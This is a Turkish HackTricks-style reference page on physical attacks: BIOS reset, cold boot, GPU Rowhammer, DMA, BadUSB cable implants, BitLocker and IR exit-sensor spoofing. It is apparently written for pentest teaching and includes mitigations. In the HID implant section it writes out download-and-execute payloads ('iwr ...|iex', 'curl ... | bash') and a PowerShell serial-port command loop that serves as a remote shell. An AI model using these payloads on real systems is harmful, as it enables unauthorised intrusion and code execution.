# Fiziksel Saldırılar

{{#include ../banners/hacktricks-training.md}}

## BIOS Parola Kurtarma ve Sistem Güvenliği

Eski PC firmware ayarları, CMOS pilini çıkararak veya belgelenmiş bir clear-CMOS jumper'ı kullanarak sıfırlanabilir. Gerekli güç kesme süresi anakarta göre değişir. Modern UEFI parolaları veya anahtarları kalıcı bellekte, gömülü bir denetleyicide ya da bir güvenlik aygıtında tutulabilir ve bu nedenle pil çıkarıldıktan sonra da korunabilir. Pinleri kısa devre etmeden önce anakart/servis kılavuzuna başvurun; bu işlem TPM ölçümlerini de geçersiz kılabilir ve disk şifreleme kurtarma sürecini başlatabilir.

Eski x86 sistemlerde **killCMOS** ve **CmosPwd** gibi araçlar, önyüklenebilir bir ortamdan CMOS destekli ayarları inceleyebilir veya değiştirebilir. CmosPwd, belgelenmiş eski BIOS ailelerinden parola biçimlerini tanır ve CMOS durumunu yedekleyebilir, geri yükleyebilir veya silebilir/sonlandırabilir; yayımlanmış derlemeleri eski DOS/Windows, Linux, FreeBSD ve NetBSD ortamlarını hedefler.<sup>[[18]](#references)</sup> Bu araçlar genel amaçlı UEFI parola kaldırıcıları değildir ve yeterli donanım/firmware erişimi gerektirir.

Bazı dizüstü bilgisayar firmware'leri, birkaç başarısız parola denemesinden sonra üreticiye özgü bir sorgulama kodu görüntüler. [bios-pw.org](https://bios-pw.org) gibi veritabanları bazı modeller için eski üretici kurtarma parolalarını türetebilir; ancak birçok sistem, türetilebilir bir sorgulama kodu sunmadan kilitlenir. Oluşturulan parolaları modele özgü kabul edin ve kalıcı deneme sayaçlarını tüketmekten kaçının.

### UEFI Güvenliği

Modern **UEFI** sistemlerinde CHIPSEC, Secure Boot değişken korumalarını denetleyebilir. Aşağıdaki değişiklik yapmayan denetimle başlayın; isteğe bağlı `-a modify` modu değişkenleri kasıtlı olarak bozmaya çalışır ve yalnızca kurtarılabilir bir laboratuvar sisteminde kullanılmalıdır. CHIPSEC, ayrıcalıklı sürücüsünün ve düşük seviyeli donanım erişiminin üretim uç noktalarında kullanılmaya uygun olmadığı konusunda uyarıda bulunur.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## RAM Analizi ve Cold Boot Saldırıları

DRAM, yenileme durduğunda tüm bitleri hemen kaybetmez. Bozulma hızı modül teknolojisine ve sıcaklığa göre önemli ölçüde değişir; soğutma, kullanılabilir verileri soğutulmamış bir güç döngüsüne kıyasla çok daha uzun süre koruyabilir. Cold-boot saldırısı, bellek modülünü hızla küçük bir edinim ortamında yeniden başlatır veya soğutulmuş modülü başka bir ortama aktarır, ham belleği yakalar ve bit bozulmasına rağmen kriptografik anahtarları yeniden oluşturur. Disk kopyalama aracı otomatik olarak fiziksel bellek imajı aracı değildir; Volatility ise yakalama işlemini edinmek yerine analiz eder. Platforma uygun, doğrulanmış bir edinim aracı kullanın.<sup>[[12]](#references)</sup>

---

## Sayfa Tablolarını Hedefleyen GPU Rowhammer

Modern GPU Rowhammer saldırıları, sıradan buffer'lar yerine **GPU sanal bellek meta verilerini** hedeflediğinde çok daha etkili hale gelir. **GDDR6 NVIDIA Ampere GPU'lar** üzerinde yapılan yakın tarihli çalışmalar, ayrıcalıksız CUDA kodu çalıştıran bir saldırganın GPU'ya özgü hammering desenleri oluşturabildiğini, sayfalama yapılarını savunmasız satırlara yerleştirmek için **memory massaging** kullanabildiğini ve ardından **son seviye sayfa tablosunda** veya bir ara **sayfa dizininde** bitleri çevirebildiğini gösteriyor. Tek bir adres çevirisi girdisi bozulduğunda saldırgan, **keyfi GPU belleğinde okuma/yazma** yeteneği elde edebilir ve ardından host sistemini ele geçirmeye geçebilir.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Deseni

1. GDDR6'da **hammering uygulanabilir satırları profilleyin** ve DRAM içi azaltımları aşan, yenileme farkındalıklı / eşit olmayan hammering desenleri oluşturun.
2. Sürücünün sayfa çevirisi yapılarını varsayılan korumalı havuzda tutmak yerine hammering uygulanabilir fiziksel konumlara yerleştirmesi için **GPU ayırmalarını düzenleyin**. Uygulamada bu, düşük bellekli sayfa tablosu bölgesini tüketmeyi ve kontrollü adımlarla büyük, seyrek UVM eşlemeleri oluşturmayı içerebilir.
3. Saldırganın kontrolündeki sanal sayfanın sayfa tablosu sayfalarına, keyfi GPU belleğine veya host tarafından görülebilen sistem eşlemelerine çözülmesini sağlamak için sayfa tablosu / sayfa dizini girdisindeki **PFN** veya aperture ile ilgili bitler gibi **çeviri meta verilerini değiştirin**.
4. Sahte eşlemeyi kullanarak başka çeviri girdilerini yeniden yazın ve GPU bağlamları arasında **keyfi GPU belleğinde okuma/yazma** yeteneğini artırın.

### Host Sistemine Geçiş ve Azaltımlar

- **IOMMU devre dışıyken**, sahte sistem aperture eşlemeleri GPU'ya keyfi **host fiziksel belleğini** açığa çıkarabilir ve GPU ilkelini host sisteminin tamamen ele geçirilmesine dönüştürebilir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** son seviye sayfa tablosu girdilerini hedeflerken, **GeForge** bir sayfa dizini seviyesini bozmanın daha kolay olabileceğini gösteriyor; çünkü tek bir bit değişikliği daha büyük bir çeviri alt ağacını yeniden hedefleyebilir. Yalnızca tek bir sayfalama katmanını güvenlik açısından kritik kabul etmeyin.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**, GDDRHammer/GeForge'un kullandığı doğrudan keyfi host belleğine erişim yolunu engellediğinden önemini korur; ancak **tam bir azaltım değildir**. **GPUBreach**, saldırganın GPU tarafından yazılabilir, sürücüye ait CPU buffer'larını bozduğu ve ardından NVIDIA sürücüsündeki bellek güvenliği hatalarını tetikleyerek IOMMU etkin olsa bile kernel yazma ilkelini ve **root shell** elde ettiği ikinci aşama bir geçiş gösteriyor.<sup>[[3]](#references)</sup>
- Desteklenen iş istasyonu/sunucu GPU'larında **sistem düzeyinde ECC** kullanmak pratik bir sağlamlaştırma adımıdır. ECC'siz tüketici GPU'ları daha zayıf bir savunma yüzeyi sunar.<sup>[[4]](#references)</sup>
- Bu saldırılar yalnızca teorik değildir: **GeForge**, RTX 3060'da **1.171**, RTX A6000'de ise **202** bit değişikliği bildirdi; bu sayılar çalışan bir host ayrıcalık yükseltme zinciri oluşturmak için yeterliydi.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Doğrudan Bellek Erişimi (DMA) Saldırıları

Önyükleme öncesi IOMMU zorlamasını düşürüp bir Windows DMA zincirini etkinleştirebilen çevrimdışı UEFI IFR/NVRAM yamalama için bkz.:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception**, FireWire ve ilk Thunderbolt yapılandırmaları gibi arayüzler üzerinden **DMA tabanlı bellek edinme ve yamalama** yöntemlerini, geçmişteki oturum açma atlatma örüntüleri de dahil olmak üzere gösteriyor. Bu yöntemler yalnızca “Windows 10'a karşı etkisiz” değildir: istismar edilebilirlik arayüze, hedef derlemeye, IOMMU politikasına, kilit durumuna ve Windows Kernel DMA Protection'ın desteklenip etkin olup olmadığına bağlıdır. Windows 10 sürüm 1803 ve sonrası, uyumlu platformlarda Kernel DMA Protection'ı kullanıma sundu ve saldırı yüzeyini önemli ölçüde değiştirdi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Sisteme Erişim için Live CD/USB

Şifrelenmemiş veya kilidi zaten açılmış bir Windows biriminde, çevrimdışı bir ortam **sethc.exe** ya da **Utilman.exe** gibi erişilebilirlik ikililerini **cmd.exe** ile değiştirebilir. Böylece ilgili oturum açma ekranı kısayolu çalıştırıldığında SYSTEM komut istemi açılır. **chntpw** gibi araçlar yerel SAM hesap verilerini düzenleyebilir. Bu yöntemler kilitli bir BitLocker biriminin korumasını aşmaz ve DPAPI/EFS ile korunan kimlik bilgilerine zarar verebilir; adli kopyaları ve yedekleri saklayın.

**Kon-Boot**, desteklenen Windows/macOS yapılandırmaları için ticari bir önyükleme zamanı kimlik doğrulama atlatma aracıdır. Uyumluluk işletim sistemine, firmware moduna, Secure Boot'a ve disk şifreleme kurulumuna bağlıdır; BitLocker ile kilitlenmiş bir birimin şifresini çözmez.<sup>[[10]](#references)</sup>

---

## Windows Güvenlik Özelliklerini Ele Alma

### Önyükleme ve Kurtarma Kısayolları

- **Delete/Supr**, F2, F10 veya başka bir üretici tuşu firmware kurulumunu açabilir.
- **F8**, yalnızca bu yolun hâlâ etkin olduğu yapılandırmalarda eski Windows gelişmiş önyükleme seçeneklerini açar; mevcut kurtarma girişi değişiklik gösterir.
- **Shift** tuşunu basılı tutmak bazı yapılandırmalarda Windows'un otomatik oturum açmasını engelleyebilir; ancak ilke/kayıt defteri ayarları bu davranışı devre dışı bırakabilir.<sup>[[17]](#references)</sup>

### BAD USB Aygıtları

**USB Rubber Ducky** ve Teensy kartları gibi aygıtlar, güvenilir HID klavyeler olarak tanımlanabilir ve önceden belirlenmiş tuş vuruşlarını gönderebilir. Payload başlangıçta oturum açmış kullanıcının oturum ayrıcalıklarına ve masaüstü erişimine sahip olur; UAC istemleri, ekran kilidi, klavye düzeni, zamanlama ve uç nokta USB politikası yine de kısıtlayıcıdır.<sup>[[15]](#references)</sup>

Programlanabilir çevre birimleri, host kernel ayrıştırıcılarına da saldırabilir ve heap grooming ile bilgi ifşası için birden fazla USB aygıtını koordine edebilir:

{{#ref}}
../binary-exploitation/linux-kernel-exploitation/usb-audio-descriptor-oob-kaslr-leak.md
{{#endref}}

### Volume Shadow Copy

Yönetici veya yedekleme ayrıcalıkları, gölge kopya oluşturmayı ya da kayıt defteri hive'larını kaydetmeyi sağlayarak **SAM** ve **SYSTEM** gibi kilitli dosyaların edinilmesine imkân verebilir. Bu, ayrıcalık atlatma değil, ihlal sonrası veri toplama tekniğidir; `diskshadow`/VSS ve kayıt defteri hive'ı dışa aktarma olaylarıyla ilişkilendirilmelidir.

## BadUSB / HID Implant Teknikleri

### NFC ile tetiklenen Android HID gadget'ı

Root edilmiş bir Android telefon, yalnızca USB denetleyicisi ve kernel'i **USB gadget/HID desteği** sağlıyorsa programlanabilir USB klavye haline gelebilir. Uyumlu aygıtlarda Kali NetHunter, gadget profillerini **USB Arsenal** üzerinden sunar. Diğer bir seçenek de ConfigFS gadget işlevleri oluşturan ve `/dev/hidg0` ile `/dev/hidg1` gibi klavye/fare karakter aygıtlarını kullanıma açabilen [USB Gadget Tool](https://github.com/tejado/android-usb-gadget) aracıdır. Araç yalnızca gadget uç noktasını oluşturur; HID raporlarını bu uç noktaya ayrı bir sürecin yazması gerekir. Root erişimi, ConfigFS, HID gadget desteği veya kullanılabilir bir USB Device Controller bulunmayan kernel'in eksiklerini gideremez.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Bu uç nokta, fiziksel tetikleyici olarak Android NFC ile birlikte kullanılabilir. [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) uygulaması bir etiket UID'sini okur, beklediği biçime dönüştürür, yerel bir izin listesinde kontrol eder ve eşleşme olduğunda yapılandırılmış Rubber Ducky tarzı bir klavye dizisi gönderir. Bağlı host sıradan klavye girdisi görür ve NFC yazılımına ihtiyaç duymaz.<sup>[[22]](#references)[[24]](#references)</sup>

Kısayolları veya komutları kullanmadan önce boş bir metin düzenleyicisinde aygıtın tanınmasını ve klavye düzenini doğrulayın. Zararsız bir payload şöyledir:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Önemli güven sınırları:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist'i kimlik tespitidir, kimlik doğrulama değildir**. UID'ler herkese açıktır ve bazı token türleri veya emülatörler kopyalamaya ya da taklit etmeye izin verir. Kopyalanmış bir izinli UID, orijinal token ile aynı yönlendirme yolunu izler.
- **NfcScreenOff** Magisk modülü, NFC hizmetini ekran açık ve kilidi kaldırılmış gibi davranacak şekilde yamalar. Telefon zaten bir host'a bağlıysa bu, telefonun kilidini açmadan birinin payload'ı tetiklemesini sağlayabilir.
- Payload'da saklanan parolalar, API token'ları ve komutlar; root erişimi olan veya bootloader kilidi açılmış bir cihazda kurtarılabilir sırlardır. HID üzerinden parola yazmak, parola kullanmadan kimlik doğrulama değil, tekrar kullanılabilir parola otomasyonudur.
- HID enjeksiyonu etkin masaüstünün ayrıcalıklarıyla çalışır ve odaklanmaya, zamanlamaya ve host klavye düzenine bağlıdır. Hassas eylemleri göndermeden önce kullanıcıdan yakın zamanda onay alınmasını zorunlu kılın, betiklerde ayrıcalıklı sırlar kullanmaktan kaçının ve gerçek kimlik doğrulama için kriptografik challenge-response kimlik doğrulayıcı kullanın.

### Wi-Fi yönetimli kablo implantları

- **Evil Crow Cable Wind** gibi ESP32-S3 tabanlı implantlar USB-A→USB-C veya USB-C↔USB-C kablolarının içine gizlenir, yalnızca USB klavye olarak tanımlanır ve C2 yığınını Wi-Fi üzerinden sunar. Operatörün tek yapması gereken kabloya kurban host'tan güç sağlamak, `Evil Crow Cable Wind` adlı ve `123456789` parolasına sahip bir hotspot oluşturmak ve gömülü HTTP arayüzüne erişmek için [http://cable-wind.local/](http://cable-wind.local/) (veya DHCP adresine) gitmektir.<sup>[[8]](#references)</sup>
- Tarayıcı arayüzünde *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* ve *Config* sekmeleri bulunur. Saklanan payload'lar işletim sistemine göre etiketlenir, klavye düzenleri anında değiştirilir ve bilinen çevre birimlerini taklit etmek için VID/PID dizeleri değiştirilebilir.
- C2 kablonun içinde bulunduğundan, bir telefon kuruluşun ağını kullanmadan payload'ları hazırlayabilir, yürütmeyi tetikleyebilir ve Wi-Fi kimlik bilgilerini yönetebilir. Bu, fiziksel erişimle gerçekleştirilen kısa süreli izinsiz girişler için kullanışlıdır.

### İşletim sistemine duyarlı AutoExec payload'ları

- AutoExec kuralları, USB tanımlamasının hemen ardından çalıştırılmak üzere bir veya daha fazla payload'ı ilişkilendirir. İmplant, hafif bir işletim sistemi parmak izi çıkarma işlemi yapar ve eşleşen betiği seçer.
- Örnek iş akışı:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) veya `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Yürütme gözetimsiz gerçekleştiğinden, şarj kablosunu değiştirmek bile oturum açmış kullanıcının bağlamında “plug-and-pwn” ilk erişimini sağlayabilir.

### Wi-Fi TCP üzerinden HID ile başlatılan remote shell

1. **Tuş vuruşlarıyla başlatma:** Saklanan bir payload konsol açar ve yeni USB seri aygıtına gelen her şeyi yürüten bir döngü yapıştırır. Windows için minimal bir örnek:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Kablo köprüsü:** Implant, USB CDC kanalını açık tutarken ESP32-S3'ü operatöre geri bağlanan bir TCP istemcisi (Python script'i, Android APK'si veya masaüstü çalıştırılabilir dosyası) başlatır. TCP oturumuna yazılan tüm baytlar yukarıdaki seri döngüye aktarılır; böylece air-gapped ana bilgisayarlarda bile uzaktan komut yürütme sağlanır. Çıktı sınırlıdır; bu nedenle operatörler genellikle kör komutlar çalıştırır (hesap oluşturma, ek araçları hazırlama vb.).

### HTTP OTA güncelleme saldırı yüzeyi

- Belgelenen Evil Crow Cable Wind arayüzü, kimlik doğrulaması gerektirmeyen bir firmware güncelleme endpoint'i olan `/update`'i kullanıma sunar:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Saha operatörleri, kabloyu açmadan görev sırasında özellikleri anında değiştirebilir (ör. USB Army Knife firmware'ini flash'layabilir); böylece implant, hedef ana bilgisayara bağlı kalırken yeni yeteneklere geçebilir.

## BitLocker Şifrelemesini Atlatma

Canlı veya yakın zamanda çalışmış bir sistemden yetkili adli kopya alındığında, birim kilidi açıkken BitLocker birim ana anahtarı veya ilgili anahtar materyali kopyada bulunabilir. Elcomsoft Forensic Disk Decryptor ve Passware Kit Forensic gibi ticari araçlar, desteklenen bellek imajlarında, hazırda bekletme dosyalarında veya çökme dökümlerinde arama yapabilir; ancak başarılı olma garantisi yoktur. Modern Windows, BitLocker etkin olduğunda çökme dökümlerini de şifreler. Ayrıca, saklanan 48 haneli kurtarma parolası, bellekteki birim anahtarından farklı bir veridir.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Kurtarma Anahtarı Eklemek İçin Sosyal Mühendislik

Bir saldırgan, yöneticiyi BitLocker yönetim komutlarını çalıştırmaya ikna ederek bir kurtarma parolası, harici anahtar veya başka bir koruyucu ekleyebilir ve ardından bunu ele geçirebilir. Kurtarma parolası, rastgele seçilmiş bir sıfırlar dizisi olamaz: BitLocker sayısal kurtarma parolaları, biçimi doğrulanan 48 haneli bir yapıya sahiptir. Yetkili yönetim için ilgili sözdizimi `manage-bde -protectors -add C: -recoverypassword` şeklindedir; eklenen koruyucuları `manage-bde -protectors -get C:` komutuyla listeleyin. Koruyucu eklemelerini izleyin ve yeni kurtarma materyalinin yalnızca onaylı konumlarda saklandığından emin olun.<sup>[[16]](#references)</sup>

---

## BIOS'u Fabrika Ayarlarına Sıfırlamak İçin Kasa İhlali / Bakım Anahtarlarından Yararlanma

Birçok modern dizüstü bilgisayar ve küçük form faktörlü masaüstü bilgisayarda, Embedded Controller (EC) ve BIOS/UEFI firmware tarafından izlenen bir **kasa ihlali anahtarı** bulunur. Anahtarın temel amacı cihaz açıldığında uyarı vermek olsa da üreticiler bazen, anahtar belirli bir düzende tetiklendiğinde devreye giren **belgelenmemiş bir kurtarma kısayolu** uygular.<sup>[[5]](#references)[[6]](#references)</sup>

### Saldırı Nasıl Çalışır

1. Anahtar, EC üzerindeki bir **GPIO kesmesine** bağlanır.
2. EC üzerinde çalışan firmware, **basışların zamanlamasını ve sayısını** takip eder.
3. Sabit kodlanmış bir düzen tanındığında EC, sistem NVRAM/CMOS içeriğini **silen** bir *mainboard-reset* yordamını çağırır.
4. Sonraki açılışta etkilenen modeller, sıfırlanmış firmware durumunu yükler. Üreticiye ve sürüme bağlı olarak silinen durum; gözetmen parolasını, özel önyükleme ayarlarını veya kayıtlı Secure Boot anahtarlarını içerebilir. TPM durumu ve disk şifrelemesi üzerindeki etkiler ayrıca değerlendirilmelidir.

> Firmware sıfırlaması harici önyükleme seçeneklerini geri yükleyebilir, ancak depolamayı **şifre çözmez**. BitLocker veya başka bir tam disk şifreleme sistemi, TPM/firmware değişikliklerinden sonra kurtarma moduna geçebilir ve kurtarma anahtarı olmadan da dahili sürücüyü korumaya devam eder.<sup>[[16]](#references)</sup>

### Gerçek Dünya Örneği – Framework 13 Dizüstü Bilgisayar

Framework 13 (11./12./13. nesil) için kurtarma kısayolu şöyledir:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Onuncu döngüden sonra EC, BIOS'a bir sonraki yeniden başlatmada NVRAM'i silmesini söyleyen bir bayrak ayarlar. Tüm işlem yaklaşık 40 saniye sürer ve **bir tornavidadan başka hiçbir şey gerektirmez**.<sup>[[5]](#references)</sup>

### Genel Exploitation Prosedürü

1. EC'nin çalışmasını sağlamak için hedefi açın veya uyku durumundan çıkarın.
2. İzinsiz giriş/bakım anahtarını açığa çıkarmak için alt kapağı çıkarın.
3. Üreticiye özgü anahtarlama düzenini tekrarlayın (belgelere ve forumlara başvurun veya EC firmware'ini tersine mühendislikle inceleyin).
4. Cihazı yeniden monte edip yeniden başlatın, ardından hangi firmware ayarlarının ve kimlik bilgilerinin gerçekten değiştiğini inceleyin.
5. Yetkiniz varsa ve harici önyükleme mümkünse, kontrollü bir live image ile önyükleme yapın. Bir dahili birim meşru biçimde açıldıktan sonra (ya da hiç şifrelenmemişse), live ortam kimlik bilgilerini ve verileri alabilir veya EFI System Partition'ı inceleyebilir. Bu bölümü değiştirerek bir EFI implantı yüklemek kalıcı ve son derece müdahaleci bir işlemdir; ayrıca Secure Boot, measured boot, firmware yazma koruması ve endpoint izleme ile sınırlıdır. Şifrelenmiş depolama, anahtarı veya kurtarma materyali olmadan erişilemez.

### Tespit ve Azaltma

* İşletim sistemi yönetim konsolunda kasa izinsiz giriş olaylarını kaydedin ve beklenmedik BIOS sıfırlamalarıyla ilişkilendirin.
* Açılmayı tespit etmek için vidalara/kapaklara **kurcalamayı belli eden mühürler** uygulayın.
* Cihazları **fiziksel olarak denetlenen alanlarda** tutun; fiziksel erişimin tam ele geçirilme anlamına geldiğini varsayın.
* Varsa üreticinin “bakım anahtarıyla sıfırlama” özelliğini devre dışı bırakın veya NVRAM sıfırlamaları için ek bir kriptografik yetkilendirme isteyin.

---

## No-Touch Çıkış Sensörlerine Karşı Gizli IR Enjeksiyonu

### Sensör Özellikleri
- Piyasada bulunan “wave-to-exit” sensörlerinde, yakın kızılötesi LED yayıcı ile yalnızca doğru taşıyıcının (≈30 kHz) birden fazla darbesini (~4–10) algıladıktan sonra lojik yüksek bildiren, TV uzaktan kumandası tarzı bir alıcı modülü birlikte kullanılır.<sup>[[7]](#references)</sup>
- Plastik bir siperlik, yayıcı ile alıcının doğrudan birbirini görmesini engeller; böylece denetleyici, doğrulanmış taşıyıcının yakındaki bir yansımadan geldiğini varsayar ve kapı kilidini açan bir röleyi etkinleştirir.
- Denetleyici bir hedefin bulunduğuna inandığında genellikle çıkış modülasyon zarfını değiştirir; ancak alıcı, filtrelenmiş taşıyıcıyla eşleşen tüm darbeleri kabul etmeyi sürdürür.

### Saldırı İş Akışı
1. **Yayılan sinyal profilini yakalayın** – dahili IR LED'i süren hem algılama öncesi hem de algılama sonrası dalga biçimlerini kaydetmek için denetleyici pinlerine bir logic analyser bağlayın.
2. **Yalnızca “algılama sonrası” dalga biçimini yeniden oynatın** – stok yayıcıyı çıkarın veya yok sayın ve harici bir IR LED'i baştan itibaren tetiklenmiş desenle sürün. Alıcı yalnızca darbe sayısı/frekansıyla ilgilendiğinden, sahte taşıyıcıyı gerçek bir yansıma olarak kabul eder ve röle hattını etkinleştirir.
3. **İletimi kapılayın** – alıcının AGC'sini veya parazit işleme mantığını doyurmadan gereken minimum darbe sayısını iletmek için taşıyıcıyı ayarlanmış aralıklarla gönderin (ör. onlarca milisaniye açık, benzer süre kapalı). Sürekli yayın sensörün hassasiyetini hızla düşürür ve rölenin çalışmasını engeller.

### Uzun Menzilli Yansıtmalı Enjeksiyon
- Tezgâh LED'ini yüksek güçlü bir IR diyot, MOSFET sürücü ve odaklama optiğiyle değiştirmek, yaklaşık 6 m mesafeden güvenilir tetiklemeye imkân verir.
- Saldırganın alıcı açıklığını doğrudan görmesi gerekmez; ışını camdan görülebilen iç duvarlara, raflara veya kapı kasalarına yöneltmek, yansıyan enerjinin yaklaşık 30° görüş alanına girmesini sağlar ve yakın mesafeden el sallamayı taklit eder.
- Alıcılar yalnızca zayıf yansımalar beklediğinden, çok daha güçlü bir harici ışın birden fazla yüzeyden yansısa bile algılama eşiğinin üzerinde kalabilir.

### Silahlandırılmış Saldırı El Feneri
- Sürücüyü ticari bir el fenerinin içine yerleştirmek, aracı herkesin gözü önünde saklar. Görünür LED'i alıcının bandına uygun, yüksek güçlü bir IR LED ile değiştirin; ≈30 kHz darbeleri üretmek için bir ATtiny412 (veya benzeri) ekleyin ve LED akımını çekmek için bir MOSFET kullanın.
- Teleskopik zoom lensi, menzil/işaretleme hassasiyeti için ışını daraltırken MCU denetimli bir titreşim motoru, görünür ışık yaymadan modülasyonun etkin olduğuna dair dokunsal onay verir.
- Birkaç kayıtlı modülasyon deseni (biraz farklı taşıyıcı frekansları ve zarflar) arasında geçiş yapmak, yeniden markalanmış farklı sensör aileleriyle uyumluluğu artırır; böylece operatör, röleden klik sesi duyup kapı açılana kadar yansıtıcı yüzeyleri tarayabilir.

---

## References

- [1] [GDDRHammer: DRAM Satırlarını Büyük Ölçüde Bozma — Modern GPU'lardan Bileşenler Arası Rowhammer Saldırıları](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: GPU Sayfa Tabloları Oluşturmak İçin GDDR Belleğini Döverek Eğlence ve Kâr Sağlama](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Rowhammer Kullanarak GPU'larda Yetki Yükseltme Saldırıları](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Güvenlik Bildirimi: Rowhammer - Temmuz 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Pwn etmek için buraya basın”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Anakart Sıfırlama Kılavuzu](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Hayıııır, Dokunma! – Gizli bir IR El Feneriyle IR Dokunmasız Çıkış Sensörlerini Atlatma”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Tak, Çalıştır, Pwn Et: Evil Crow Cable Wind ile Hacking”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - NVIDIA Çiplerine Karşı Rowhammer Saldırısı](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Kon-Boot resmi belgeleri ve uyumluluk bilgileri](https://kon-boot.com/)
- [11] [CHIPSEC belgeleri - Secure Boot değişken korumaları](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Unutmamak Gerekirse: Şifreleme Anahtarlarına Karşı Cold Boot Saldırıları](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - DMA üzerinden fiziksel bellek manipülasyonu](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Kernel DMA Koruması](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Hak5 USB Rubber Ducky belgeleri](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - BitLocker işlemleri kılavuzu](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Shift tuşunu basılı tutma ve otomatik oturum açma davranışı](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - CmosPwd belgeleri ve indirmeler](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux Belgeleri - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Linux kernel belgeleri - USB HID gadget sürücüsü](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Root Yetkili Android Telefonu Bilgisayarınız İçin NFC Kimlik Doğrulayıcı ve Otomasyon Aracına Dönüştürme](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
